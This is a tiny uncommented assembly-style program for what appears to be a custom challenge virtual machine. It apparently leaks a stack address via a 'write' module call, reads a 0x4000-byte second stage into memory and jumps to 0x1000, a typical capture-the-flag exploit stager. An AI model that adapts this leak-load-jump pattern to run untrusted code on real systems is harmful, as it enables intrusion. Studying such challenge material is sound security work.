read equ 0xf06d7659e3c6851c
write equ 0x14242c101498d2fc

pop
pop
pop
pop
pop

lea 0
push8 8
lea 0
modcall write

pop
pop

push8 0x4000
push8 0x1f000
lea 0
sub
modcall read
pop
jmp 0x1000